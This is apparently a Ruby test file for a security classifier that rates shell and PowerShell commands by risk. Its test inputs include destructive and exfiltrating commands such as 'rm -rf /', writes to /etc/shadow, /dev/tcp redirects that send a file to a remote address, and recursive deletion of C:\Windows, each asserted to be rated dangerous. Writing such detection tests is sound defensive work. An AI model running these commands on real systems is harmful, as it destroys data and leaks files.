# frozen_string_literal: true

require_relative "../test_helper"
require_relative "../../lib/rubik/security/classifier"

class TestCommandClassifierIntegration < Minitest::Test
  Classifier = Rubik::Security::Classifier

  def test_suppresses_false_positives_in_strings
    res = Classifier.classify('echo "do not run rm -rf /"')
    assert_equal :readonly, res.classification
    assert_equal :low, res.risk

    res2 = Classifier.classify('git commit -m "fix rm -rf / issue"')
    assert_equal :local_effects, res2.classification
    assert_equal :low, res2.risk
  end

  def test_detects_dangerous_root_deletion
    res = Classifier.classify("rm -rf /")
    assert_equal :dangerous, res.classification
    assert_equal :high, res.risk

    res2 = Classifier.classify("sudo rm -rf /")
    assert_equal :dangerous, res2.classification
    assert_equal :high, res2.risk
  end

  def test_detects_system_path_write_redirect
    res = Classifier.classify("echo malicious > /etc/shadow")
    assert_equal :dangerous, res.classification
    assert_equal :high, res.risk
  end

  def test_allows_temp_path_redirects
    res = Classifier.classify("cat file.txt > /tmp/temp_out.txt")
    assert_equal :local_effects, res.classification
    # Only writing to temp path keeps risk lower
    assert_equal ["/tmp/temp_out.txt"], res.write_paths
  end

  def test_detects_dev_tcp_network_redirection
    res = Classifier.classify("cat < /dev/tcp/10.0.0.1/8080")
    assert_equal :dangerous, res.classification
    assert_equal :high, res.risk
  end

  def test_powershell_classification
    res = Classifier.classify("Remove-Item -Recurse C:\\Windows", shell: :powershell)
    assert_equal :dangerous, res.classification
    assert_equal :high, res.risk

    res2 = Classifier.classify("Get-ChildItem -Path C:\\Users", shell: :powershell)
    assert_equal :readonly, res2.classification
    assert_equal :low, res2.risk
  end

  def test_background_command_elevation
    res = Classifier.classify("sleep 10 &")
    assert_equal :local_effects, res.classification
    assert_equal :medium, res.risk
  end

  # Inner system-path elevation must not be silent: blocked-command guidance
  # explains WHY a wrapped segment is dangerous, and for `rm -rf /` inside
  # bash -c the system-path elevation is the only evidence there is.
  def test_inner_system_path_elevation_sets_reason
    res = Classifier.classify('bash -c "rm -rf /"')
    inner = res.commands.first.inner_commands.first
    assert_equal :dangerous, inner.classification
    assert_includes inner.classification_reason, "system path /"
  end

  # Inner redirects must survive delegation: the unwrapped form is blocked
  # with a system-path reason, so the wrapped form must be too — the old
  # argv-only handoff let `bash -c 'echo pwned > /etc/shadow'` through.
  def test_inner_redirect_survives_delegation
    res = Classifier.classify("bash -c 'echo pwned > /etc/shadow'")
    assert_equal :dangerous, res.classification
    assert_equal :high, res.risk

    inner = res.commands.first.inner_commands.first
    assert_equal :dangerous, inner.classification
    assert_includes inner.classification_reason, "elevated by output redirect"
    assert_includes inner.classification_reason, "system path /etc/shadow"
    assert_equal ["/etc/shadow"], res.write_paths
  end

  def test_inner_dev_tcp_redirect_survives_delegation
    res = Classifier.classify("bash -c 'cat f > /dev/tcp/10.0.0.1/8080'")
    assert_equal :dangerous, res.classification

    inner = res.commands.first.inner_commands.first
    assert_equal :dangerous, inner.classification
    assert_equal "elevated to DANGEROUS: /dev/tcp or /dev/udp access detected", inner.classification_reason
  end

  def test_inner_temp_redirect_stays_safe
    res = Classifier.classify("bash -c 'echo x > /tmp/out.txt'")
    inner = res.commands.first.inner_commands.first
    assert_equal :local_effects, inner.classification
    assert_equal :low, inner.risk
    assert_includes inner.classification_reason, "elevated by output redirect"
    refute_includes inner.classification_reason, "system path"
  end

  # Nested wrappers: the token-slice outer (sudo) has no redirect objects,
  # but the inner `sh -c` re-parse carries them at its own level.
  def test_nested_wrapper_inner_redirect_elevates
    res = Classifier.classify("sudo sh -c 'echo x > /etc/y'")
    assert_equal :dangerous, res.classification
  end

  def test_inner_read_redirect_stays_inert
    res = Classifier.classify("bash -c 'grep x < /etc/hosts'")
    assert_equal :readonly, res.classification
    inner = res.commands.first.inner_commands.first
    assert_equal :readonly, inner.classification
  end

  # Expression-level elevation (mutating pipeline + system directory) is the
  # one DANGEROUS producer with no dangerous command — the composed reason
  # must ride on the ExpressionResult itself.
  def test_expression_level_elevation_sets_reason
    res = Classifier.classify("cd /etc && touch x")
    assert_equal :dangerous, res.classification
    assert_equal "mutating pipeline (touch) touches system directory /etc", res.classification_reason
  end

  def test_expression_reason_nil_without_expression_elevation
    res = Classifier.classify("git status")
    assert_nil res.classification_reason
  end

  # Issue #97 finding 1: the fail-closed gate denied read-only flag variants
  # of common toolchains (strict-mode unmodeled options force UNKNOWN) while
  # letting the mutating base forms through. The curated DB must classify the
  # safe variants at least as permissively as the mutating ones.
  def test_issue97_readonly_flag_variants_of_toolchains
    verdicts = {
      "cargo fmt --check" => :readonly,
      "cargo clippy --workspace" => :readonly,
      "cargo --version" => :readonly,
      "cargo install --list" => :readonly,
      "rustfmt --version" => :readonly,
      "rustfmt --check src/main.rs" => :readonly,
      "crystal --version" => :readonly,
      "crystal tool format --check" => :readonly,
      "crystal tool types src/app.cr" => :readonly,
      "systemd-run --user --scope -p MemoryMax=2G true" => :local_effects
    }
    verdicts.each do |cmd, expected|
      assert_equal expected, Classifier.classify(cmd, shell: "bash").classification, cmd
    end
  end

  # The mutating forms keep (or exceed) the classification of their read-only
  # variants — curation must never soften the base verb.
  def test_issue97_mutating_forms_keep_their_classification
    verdicts = {
      "cargo fmt" => :local_effects,
      "cargo test --workspace" => :local_effects,
      "cargo test -- --nocapture" => :local_effects,
      "cargo build --release" => :local_effects,
      "rustfmt src/main.rs" => :local_effects,
      "crystal spec" => :local_effects,
      "crystal spec spec/db_spec.cr" => :local_effects,
      "crystal build --release app.cr" => :local_effects,
      "crystal run app.cr" => :dangerous
    }
    verdicts.each do |cmd, expected|
      assert_equal expected, Classifier.classify(cmd, shell: "bash").classification, cmd
    end
  end

  def test_windows_drive_prefix_tightening_system_path
    engine = Rubik::Security::Classifier::Engine.new
    # Non-path single letter colon tokens must NOT be system paths
    refute engine.system_path?("a:")
    refute engine.system_path?("A:")
    refute engine.system_path?("c:")
    refute engine.system_path?("C:")
    refute engine.system_path?("x:")
    refute engine.system_path?("z:")
    refute engine.system_path?("c:foo")
    refute engine.system_path?("a:1")

    # Genuine drive roots and paths MUST remain system paths
    assert engine.system_path?("C:/")
    assert engine.system_path?("c:/")
    assert engine.system_path?("C:\\")
    assert engine.system_path?("c:\\")
    assert engine.system_path?("C:/*")
    assert engine.system_path?("C:\\*")
    assert engine.system_path?("C:\\Windows\\System32")
    assert engine.system_path?("c:/users/")
  end

  def test_command_with_non_path_colon_arguments_does_not_elevate
    # Commands with 'a:' or 'c:' in argv must not be elevated to DANGEROUS
    res1 = Classifier.classify("git commit -m a:")
    assert_equal :local_effects, res1.classification
    refute_includes res1.commands.first.classification_reason.to_s, "system path"

    res2 = Classifier.classify("git commit -m c:")
    assert_equal :local_effects, res2.classification

    # Actual root reference MUST elevate to DANGEROUS
    res3 = Classifier.classify("git commit -m C:/")
    assert_equal :dangerous, res3.classification
    assert_includes res3.commands.first.classification_reason.to_s, "system path C:/"
  end

  def test_ruby_toolchain_commands
    verdicts = {
      "ruby -v" => :readonly,
      "ruby --version" => :readonly,
      "ruby -c script.rb" => :readonly,
      "ruby script.rb" => :local_effects,
      "ruby -e 'exit(0)'" => :dangerous,
      "bundle check" => :readonly,
      "bundle list" => :readonly,
      "bundle install" => :local_effects,
      "bundle update" => :local_effects,
      "bundle exec rake test" => :local_effects,
      "bundle exec rspec" => :local_effects,
      "bundle exec rubocop" => :readonly,
      "bundle exec rubocop -a" => :local_effects,
      "bundle exec rubocop --autocorrect" => :local_effects,
      "rake -T" => :readonly,
      "rake test" => :local_effects,
      "rspec --version" => :readonly,
      "rspec spec/foo_spec.rb" => :local_effects,
      "rubocop" => :readonly,
      "rubocop -a" => :local_effects,
      "gem list" => :readonly,
      "gem search rubik" => :readonly,
      "gem install rake" => :local_effects,
      "gem push foo.gem" => :dangerous
    }
    verdicts.each do |cmd, expected|
      assert_equal expected, Classifier.classify(cmd, shell: "bash").classification, "Failed for #{cmd}"
    end
  end

  def test_compiler_and_system_toolchains
    verdicts = {
      # Zig
      "zig version" => :readonly,
      "zig test src/main.zig" => :local_effects,
      "zig build test" => :local_effects,
      "zig fmt --check src/" => :readonly,
      "zig fmt src/" => :local_effects,
      "zig run src/main.zig" => :dangerous,
      # CMake & CTest
      "cmake --version" => :readonly,
      "cmake -B build" => :local_effects,
      "ctest -N" => :readonly,
      "ctest --show-only" => :readonly,
      "ctest" => :local_effects,
      # GCC & Clang
      "gcc --version" => :readonly,
      "gcc -fsyntax-only main.c" => :readonly,
      "gcc -c main.c -o main.o" => :local_effects,
      "clang --version" => :readonly,
      "clang -fsyntax-only main.c" => :readonly,
      "clang -c main.c -o main.o" => :local_effects,
      # Clang-Format
      "clang-format --version" => :readonly,
      "clang-format src/foo.c" => :readonly,
      "clang-format -i src/foo.c" => :local_effects,
      # Rustc
      "rustc --version" => :readonly,
      "rustc --print target-list" => :readonly,
      "rustc src/main.rs" => :local_effects,
      # Gofmt
      "gofmt src/main.go" => :readonly,
      "gofmt -d src/main.go" => :readonly,
      "gofmt -w src/main.go" => :local_effects,
      # Bun
      "bun --version" => :readonly,
      "bun test" => :local_effects,
      "bun install" => :local_effects,
      "bun run index.ts" => :local_effects,
      "bun x eslint" => :dangerous,
      # Biome
      "biome --version" => :readonly,
      "biome check src/" => :readonly,
      "biome check --write src/" => :local_effects,
      "biome format src/" => :readonly,
      "biome format --write src/" => :local_effects
    }
    verdicts.each do |cmd, expected|
      assert_equal expected, Classifier.classify(cmd, shell: "bash").classification, "Failed for #{cmd}"
    end
  end

  def test_pnpm_subcommands_local_effects
    assert_equal :local_effects, Classifier.classify("pnpm test").classification
    assert_equal :local_effects, Classifier.classify("pnpm t").classification
    assert_equal :local_effects, Classifier.classify("pnpm run build").classification
    assert_equal :local_effects, Classifier.classify("pnpm run-script test").classification
  end

  def test_python_and_python3_test_runners
    runners = [
      "python -m unittest",
      "python -m pytest test/unit",
      "python -m mypy src/",
      "python -m ruff check src/",
      "python3 -m unittest",
      "python3 -m pytest test/unit",
      "python3 -m mypy src/",
      "python3 -m ruff check src/"
    ]
    runners.each do |cmd|
      assert_equal :local_effects, Classifier.classify(cmd).classification, "Failed for #{cmd}"
    end

    # Dangerous executions must remain DANGEROUS
    assert_equal :dangerous, Classifier.classify("python -c 'import os; os.system(\"rm -rf /\")'").classification
    assert_equal :dangerous, Classifier.classify("python3 -c 'import os; os.system(\"rm -rf /\")'").classification
    assert_equal :dangerous, Classifier.classify("python script.py").classification
    assert_equal :dangerous, Classifier.classify("python3 script.py").classification
    assert_equal :dangerous, Classifier.classify("python -m unknown_module").classification
  end
end
